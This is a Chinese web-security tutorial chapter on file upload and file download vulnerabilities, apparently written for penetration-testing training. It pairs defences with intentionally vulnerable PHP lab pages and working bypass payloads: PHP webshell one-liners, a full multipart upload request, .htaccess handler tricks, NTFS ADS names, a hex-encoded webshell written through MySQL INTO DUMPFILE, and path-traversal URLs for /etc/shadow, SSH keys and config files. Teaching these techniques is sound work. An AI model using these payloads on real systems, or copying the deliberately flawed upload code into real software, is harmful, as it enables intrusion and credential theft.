

# 3.8、文件处理

## **1）文件上传**

一个正常的业务需求，问题在于控制上传合法文件。

**防御文件上传**

- 客户端javascript校验（通常校验扩展名）
- 检查MIME类型
- 检查内容是否合法
- 随机文件名*
- 检查文件扩展名*
- 隐藏路径*
- 重写内容（影响效率）imagecreatefromjpeg...

**测试思路**

- 客户端javascript校验：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包，抓包改包可绕过。直接修改前端也可以。
- 检测MIME类型：修改MIME类型为【image/jpeg】图片头的方式绕过。

- 检查内容是否合法：

- - 绕过方法1：test.phtml文件

```
  <script language="php">
      phpinfo();
  </script>
```

- - 绕过方法2：使用PHP输出表达式

```
<?=system($_REQUEST['cmd']);?>
```
- - 绕过方法3：将一句话Webshell与图片合并起来，命令【copy 1.jpg/b + 1.asp/a 2.jpg】，生成的2.jpg就是webshell。
- 随机文件名*：受到业务需求限制，例如头像必须要被访问到。
- 检查文件扩展名*：
- - 黑名单绕过方法：使用不同的后缀名

```
php php3、php5、phtml、PHP、pHp、phtm
jsp jspx、jspf
asp asa、cer、aspx
exe exee
```

- - 白名单绕过方法：

```
•配合文件包含漏洞:
•截断绕过:使用00截断后缀的方式，如test.php(0x00).jpg
•利用NTFS ADS特性:对Linux无效。
    上传的文件名  服务器表面现象    生成的文件内容 
    Test.php:a.jpg     生成Test.php  空 
    Test.php::$DATA  生成test.php  <?php phpinfo();?> 
    Test.php::$INDEX_ALLOCATION  生成test.php文件夹   
    Test.php::$DATA\0.jpg  生成0.jpg  <?php phpinfo();?> 
    Test.php::$DATA\aaa.jpg  生成aaa.jpg  <?php phpinfo();?> 
•配合服务器解析漏洞:
- IIS5.X~6.X解析漏洞（xx.asp;.jpg）、asp.asp目录下放图片文件
- WebDav PUT
- Apache解析漏洞
- - 低版本Apache解析文件的规则是从右到左开始判断解析。
- - 上传.htaccess文件。例如webshell名字为1.jpg，上传以下内容。就可以让apache将1.jpg当成php文件处理。
    <FilesMatch "1.jpg"> 
        SetHandler application/x-httpd-php 
    </FilesMatch>
- nginx解析漏洞(Nginx<8.03)：当cgi.fix_pathinfo开启时(为1），访问www.xx.com/phpinfo.jpg/1.php,会将phpinfo.jpg当作php解析。
•配合CMS、编辑器漏洞
```

### 客户端javascript校验（通常校验扩展名）

```

<?php
function random_str($length=32){

    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $password ='';
for ( $i = 0; $i < $length; $i++ )
{
    $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
}  
return $password;
}

if(isset($_FILES["file"])){
    if ($_FILES["file"]["size"] < 20000)
    {
        if ($_FILES["file"]["error"] > 0)
        {
            echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
        else
        {
            echo "Upload: " . $_FILES["file"]["name"] . "<br />";
            echo "Type: " . $_FILES["file"]["type"] . "<br />";
            echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
            echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

            if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
                echo $_FILES["file"]["name"] . " already exists. ";
            }
            else
            {
                $random_name=random_str();
                $filename=$random_name.substr($_FILES["file"]["name"],strrpos($_FILES["file"]["name"],'.'),strlen($_FILES["file"]["name"]));

                move_uploaded_file($_FILES["file"]["tmp_name"],
                    "upload/" . $filename);
                echo "Stored in: " . "upload/" . $filename;
            }
        }
    }
    else
    {
        echo "Invalid file";
    }
}
?>
<html>
<body>
<script>
    function checkFileExt()
    {
        var flag = false; //状态
        var arr = ["jpg","png","gif"];    //检查后缀名
        var filename='';

        filename=document.getElementById("file").value;

        //取出上传文件的扩展名
        var index = filename.lastIndexOf(".");
        var ext = filename.substr(index+1);
        //循环比较
        for(var i=0;i<arr.length;i++)
        {
            if(ext == arr[i])
            {
                flag = true;
                break;
            }
        }
        if(flag)
        {
            document.getElementById("form").submit();
        }else
        {
            alert("文件名不合法");
        }
    }
</script>

<form action="" method="post"
      enctype="multipart/form-data" id="form">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="button" name="upload" value="upload" onclick="checkFileExt()"/>
</form>

</body>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
</html>
```

**Payload：**

```
1、chrome修改Javascript函数
2、burpsuite直接发包
3、菜刀连接不上就用<?php @eval($_REQUEST['c']); ?>使用GET方式请求执行命令。
```



### 检查MIME类型

```
<?php
function random_str($length=32){

    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $password ='';
for ( $i = 0; $i < $length; $i++ )
{
    $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
}  
return $password;
}

// 判断上传类型
if(isset($_FILES["file"])){
    if ((($_FILES["file"]["type"] == "image/gif")
            || ($_FILES["file"]["type"] == "image/jpeg")
            || ($_FILES["file"]["type"] == "image/pjpeg"))
        && ($_FILES["file"]["size"] < 20000))
    {
        if ($_FILES["file"]["error"] > 0)
        {
            echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
        else
        {
            echo "Upload: " . $_FILES["file"]["name"] . "<br />";
            echo "Type: " . $_FILES["file"]["type"] . "<br />";
            echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
            echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

            if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
                echo $_FILES["file"]["name"] . " already exists. ";
            }
            else
            {
                $random_name=random_str();
                $filename=$random_name.substr($_FILES["file"]["name"],strrpos($_FILES["file"]["name"],'.'),strlen($_FILES["file"]["name"]));

                move_uploaded_file($_FILES["file"]["tmp_name"],
                    "upload/" . $filename);
                echo "Stored in: " . "upload/" . $filename;
            }
        }
    }
    else
    {
        echo "Invalid file";
    }
}
?>
<html>
<body>

<form action="" method="post"
      enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
</form>

</body>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
</html>
```

**Payload：**

```
修改content-type为：image/jpeg
```



### 检查文件内容1

检查是否为“<?php”

```
<?php
function random_str($length=32){

    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $password ='';
    for ( $i = 0; $i < $length; $i++ )
    {
        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
    }
    return $password;
}

if(isset($_FILES["file"])){
    if ($_FILES["file"]["size"] < 20000)
    {
        if ($_FILES["file"]["error"] > 0)
        {
            echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
        else
        {
            echo "Upload: " . $_FILES["file"]["name"] . "<br />";
            echo "Type: " . $_FILES["file"]["type"] . "<br />";
            echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
            echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

            if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
                echo $_FILES["file"]["name"] . " already exists. ";
            }
            else
            {

                $content=file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content,"<?php")!==false){  //检查文件内容
                    die("you are a hacker! refuse to upload!");
                }

                $random_name=random_str();
                $filename=$random_name.substr($_FILES["file"]["name"],strrpos($_FILES["file"]["name"],'.'),strlen($_FILES["file"]["name"]));

                move_uploaded_file($_FILES["file"]["tmp_name"],
                    "upload/" . $filename);
                echo "Stored in: " . "upload/" . $filename;
            }
        }
    }
    else
    {
        echo "Invalid file";
    }
}
?>
<html>
<body>

<form action="" method="post"
      enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
</form>

</body>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
</html>
```

**Payload：**

```
<?=system($_REQUEST['cmd']); ?>
```



### 检查文件内容2

检查是否为“<?php”，或者"<?="。

```
<?php
function random_str($length=32){

    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $password ='';
    for ( $i = 0; $i < $length; $i++ )
    {
        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
    }
    return $password;
}

if(isset($_FILES["file"])){
    if ($_FILES["file"]["size"] < 20000)
    {
        if ($_FILES["file"]["error"] > 0)
        {
            echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
        else
        {
            echo "Upload: " . $_FILES["file"]["name"] . "<br />";
            echo "Type: " . $_FILES["file"]["type"] . "<br />";
            echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
            echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

            if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
                echo $_FILES["file"]["name"] . " already exists. ";
            }
            else
            {

                $content=file_get_contents($_FILES["file"]["tmp_name"]);
                //检查文件内容
                if(stripos($content,"<?php")!==false or stripos($content,"<?=")!==false){
                    die("you are a hacker! refuse to upload!");
                }

                $random_name=random_str();
                $filename=$random_name.substr($_FILES["file"]["name"],strrpos($_FILES["file"]["name"],'.'),strlen($_FILES["file"]["name"]));

                move_uploaded_file($_FILES["file"]["tmp_name"],
                    "upload/" . $filename);
                echo "Stored in: " . "upload/" . $filename;
            }
        }
    }
    else
    {
        echo "Invalid file";
    }
}
?>
<html>
<body>

<form action="" method="post"
      enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
</form>

</body>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
</html>
```

**Payload**

使用`<script language="php">标签绕过`

```
<script language="php">
    eval($_REQUEST['cmd']);
</script>
```



### 检查文件内容getimagesize()

使用getimagesize()函数判断是否为图片。

```
<?php
function random_str($length=32){

    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $password ='';
    for ( $i = 0; $i < $length; $i++ )
    {
        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
    }
    return $password;
}

if(isset($_FILES["file"])){
    if ($_FILES["file"]["size"] < 200000)
    {
        if ($_FILES["file"]["error"] > 0)
        {
            echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
        else
        {

            if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
                echo $_FILES["file"]["name"] . " already exists. ";
            }
            else
            {
                // 检查是否为图片
                $file_array=getimagesize($_FILES["file"]["tmp_name"]);
                if($file_array[0]<=0||$file_array[1]<=0)
                    die("this is not a real image! abort uploading! ");

                echo "Upload: " . $_FILES["file"]["name"] . "<br />";
                echo "Type: " . $_FILES["file"]["type"] . "<br />";
                echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
                echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

                $random_name=random_str();
                $filename=$random_name.substr($_FILES["file"]["name"],strrpos($_FILES["file"]["name"],'.'),strlen($_FILES["file"]["name"]));

                move_uploaded_file($_FILES["file"]["tmp_name"],
                    "upload/" . $filename);
                echo "Stored in: " . "upload/" . $filename;
            }
        }
    }
    else
    {
        echo "Invalid file";
    }
}
?>
<html>
<body>

<form action="" method="post"
      enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
</form>

</body>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
</html>
```

**测试方法**

```
上传一个真实图片，然后在图片后面加入php代码。

gif89a 
...
<?php eval($_REQUEST['c']);?>
```



### 检查文件后缀-黑名单

检查如果是php就无法上传。

```
<?php
function random_str($length=32){

    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $password ='';
    for ( $i = 0; $i < $length; $i++ )
    {
        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
    }
    return $password;
}

if(isset($_FILES["file"])){
    if ($_FILES["file"]["size"] < 20000)
    {
        if ($_FILES["file"]["error"] > 0)
        {
            echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
        else
        {
            echo "Upload: " . $_FILES["file"]["name"] . "<br />";
            echo "Type: " . $_FILES["file"]["type"] . "<br />";
            echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
            echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

            if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
                echo $_FILES["file"]["name"] . " already exists. ";
            }
            else
            {

                $content=file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content,"<?php")!==false){
                    die("you are a hacker! refuse to upload!");
                }
                //检查文件后缀
                if($_FILES["file"]["name"]=="php"){
                    die("you cannot upload phpfile!!");
                }

                $random_name=random_str();
                $filename=$random_name.substr($_FILES["file"]["name"],strrpos($_FILES["file"]["name"],'.'),strlen($_FILES["file"]["name"]));

                move_uploaded_file($_FILES["file"]["tmp_name"],
                    "upload/" . $filename);
                echo "Stored in: " . "upload/" . $filename;
            }
        }
    }
    else
    {
        echo "Invalid file";
    }
}
?>
<html>
<body>

<form action="" method="post"
      enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
</form>

</body>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
</html>
```

**Payload**

上传php3、php5、phtml、PHP、pHp、phtm后缀文件，组合检测内容的方法上传，HTTP数据包：

```


POST /upload5.php HTTP/1.1
Host: 202.112.51.134:8081
Content-Length: 345
Cache-Control: max-age=0
Origin: http://202.112.51.134:8081
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNtdg7SskoMrXNXo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://202.112.51.134:8081/upload5.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=z|1535994035756; UM_distinctid=165a06110a7473-09e856e4fe79bd-47e1039-100200-165a06110a96e; CNZZDATA1261523779=665741857-1535994032-%7C1537339520
Connection: close

------WebKitFormBoundaryKNtdg7SskoMrXNXo
Content-Disposition: form-data; name="file"; filename="REQUEST.phtml"
Content-Type: application/octet-stream

<?=system($_REQUEST['cmd']);echo "\r\ntest"?>
------WebKitFormBoundaryKNtdg7SskoMrXNXo
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryKNtdg7SskoMrXNXo--

```

### 检查后缀漏洞代码-白名单


```
<?php
#echo $_FILES["file"]["type"];
#echo $_FILES["file"]["size"];
$st = substr(strrchr($_FILES["file"]["name"], '.'), 1);
#echo $st;
if ((($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/png"))
&& ($_FILES["file"]["size"] < 500000)&& (($st == "gif")|| ($st=="png") || ($st=="jpg")||($st=="php3")||($st=="php4"))) //检查文件后缀
  {	 
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

    if (file_exists("upload/" . $_FILES["file"]["name"]))
      {
      echo $_FILES["file"]["name"] . " already exists. ";
      }
    else
      {
      move_uploaded_file($_FILES["file"]["tmp_name"],
      "upload/" . $_FILES["file"]["name"]);
      echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
      }
    }
  }
else
  {
  echo "Invalid file";
  }
?>
```

**测试方法**

```
1.创建.htaccess文件，编辑内容为：
SetHandler application/x-httpd-php
然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。
2.编辑内容为：
<Files shell.jpg> 
ForceType application/x-httpd-php 
SetHandler application/x-httpd-php 
</Files>

指定文件名的文件，才能被当做PHP解析。
```

## **2）文件下载**

由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件。

### **防御文件下载**

- 过滤.(点)，使用户在url中不能回溯上级目录

- 正则严格判断用户输入参数的格式

- php.ini配置open_basedir限定文件访问范围

### **测试方法**

```
download.php?file=../../../../../../../../etc/passwd
```
- 敏感文件——Windows
```
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\ProgramFiles\mysql\my.ini //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD //Mysqlroot
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
```
- 敏感文件——Linux
```
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts
/etc/passwd
/etc/shadow
/etc/my.cnf
/etc/httpd/conf/httpd.conf
/root/.bash_history
/root/.mysql_history
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/porc/config.gz
```
- 常见架构利用-配置信息（java、aspx、asp、php）
- - Java

1）tomcat-users.xml

```
http://www.test.cn/down.jsp?filename=tomcat-users.xml&path=C:/Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/tomcat-users.xml

从下载到的tomcat-users.xml文件中取得tomcat控制台的登录账号和密码，尝试登录manager/html，上传一个war文件，就可以获得webshell。
```

2）web.xml

```
配置文件jsp的配置文件放在根目录WEB-INF/Web.xml下(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)
http://test/file.do?method=downFile&fileName=../WEB-INF/Web.xml
```

- - aspx

1）web.config
```
下载web.config文件,获得数据库密码登录数据库，利用sqlserver完成渗透。
http://www.test.org/DownLoadFileLow.aspx?FileName=../web.config
http://www.test.org/DownLoadFileLow.aspx?FileName=../../web.config
```
2）下载dll文件
```
http://www.test.com.cn/DownLoad.aspx?fileName=../../DownLoad.aspx
http://www.test.com.cn/DownLoad.aspx?fileName=../../DownLoad.aspx.cs
DownLoad.aspx对应的源代码是xkcms.webForm.DownLoad，猜解dll文件名。
http://www.test.com.cn/DownLoad.aspx?fileName=../../bin/xkcms.dll
http://www.test.com.cn/DownLoad.aspx?fileName=../../bin/webForm.dll
```
- - asp

```
1)找到网站与数据库操作的动态页面，动态页面中一般使用include包含连接数据库的配置文件。
http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/F89A1/inc/conn.asp

2)打开该文件，获取access数据库路径。
http://www.testcn/jianshen/database/adsfkldfogowerjnokfdslwejhdfsjhk.mdb

3)获取mdb文件
http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/database/adsfkldfogowerjnokfdslwejhdfsjhk.mdb

4)得到数据库中管理密码，登录后台。
```

- - php

```
1）下载数据库配置文件，获取数据库密码
www.test.edu.tw/download.php?filename=../conf/config.php&dir=/&title=config.php

2）思路1：使用phpMyAdmin进行管理，登录后台导出webshell
select 0x3c3f706870206576616c28245f504f53545b27636d64275d293f3e into dumpfile '/home/webadm/public_html/app/test.php'

3）思路2：远程连接3306端口，操作Mysql
```

**文件下载漏洞代码**

```
<?php
if (isset($_REQUEST['file'])) {
    $file='files/' . $_REQUEST['file'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer'); //描述页面返回的结果
        header('Content-Type: application/octet-stream'); //返回内容的类型，此处只知道是二进制流。具体返回类型可参考http://tool.oschina.net/commons
        header('Content-Disposition: attachment; filename=' . basename($file));//可以让浏览器弹出下载窗口
        header('Content-Transfer-Encoding: binary');//内容编码方式，直接二进制，不要gzip压缩
        header('Expires: 0');//过期时间
        header('Cache-Control: must-revalidate');//缓存策略，强制页面不缓存，作用与no-cache相同，但更严格，强制意味更明显
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));//文件大小，在文件超过2G的时候，filesize()返回的结果可能不正确

        $content = file_get_contents($file);
        echo $content;
    } else {
        die("this file does not exist!");
    }

} else {
    echo '<a href="download.php?file=1.jpg">下载图片</a>';
}
?>
<br/><br/><br/><br/><br/><br/><br/>
<?php highlight_file(__FILE__);?>
```

**测试方法**

```
http://localhost/download.php?file=../download.php
http://localhost/download.php?file=../../../../etc/passwd
```